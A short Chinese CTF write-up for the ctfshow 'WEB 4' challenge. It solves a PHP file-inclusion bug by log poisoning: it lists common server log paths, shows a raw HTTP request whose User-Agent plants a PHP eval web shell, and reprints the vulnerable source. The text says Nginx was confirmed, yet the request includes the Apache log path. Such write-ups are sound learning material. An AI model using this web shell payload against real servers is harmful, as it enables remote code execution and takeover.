---
tags:
  - CTF
  - ctfshow
  - 日志注入
---
[WEB 4](https://ctf.show/challenges#web4-9)

题目有一个
```php
<?php include($_GET['url']);?>
```
但是WAF把php伪协议ban了，可以考虑使用日志注入。
先构造一个带php代码的请求，然后这段php代码就会被写入日志，此时再用 `include` 包含，就会执行其中的代码。

常见日志路径

| **服务器/系统**             | **常见日志路径**                                                    |
| ---------------------- | ------------------------------------------------------------- |
| **Apache (Ubuntu)**    | `/var/log/apache2/access.log` 或 `error.log`                   |
| **Apache (CentOS)**    | `/var/log/httpd/access_log`                                   |
| **Nginx**              | `/var/log/nginx/access.log` 或 `error.log`                     |
| **SSH (Auth)**         | `/var/log/auth.log` (尝试通过 `ssh '<?php ... ?>'@target.com` 注入) |
| **Windows (phpStudy)** | `../phpstudy_pro/Extensions/Apache2.4.39/logs/access.log`     |

访问 `/var/log/nginx/access.log` ，是有内容的，可以确定是Nginx
通过 User-Agent 写入
```
GET /?url=/var/log/apache2/access.log HTTP/1.1
Host: b404a78f-a15d-43e7-85c9-1aaa1376897d.challenge.ctf.show
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: <?php @eval($_POST['ant']);die();?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

注意千万语法别写错了，不然可能后面都执行不了了

然后就可以拿flag了

本题 `index.php` 源码
```php
error_reporting(0);
$url=$_GET['url'];
if(isset($url)){
    if(stripos($url,"php")===false && stripos($url,"data")===false){
       include($url);
    }else{
        die("error");
    }
}
    
?>
<html lang="zh-CN">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0" />
    <title>ctf.show_web4</title>
</head>
<body>
    <center>
    <h2>ctf.show_web4</h2>
    <hr>
    <h3>
    <?php
            
            $code="<?php include($"."_GET['url']);?>";
            highlight_string($code);
    ?>
    </center>

</body>
</html>
```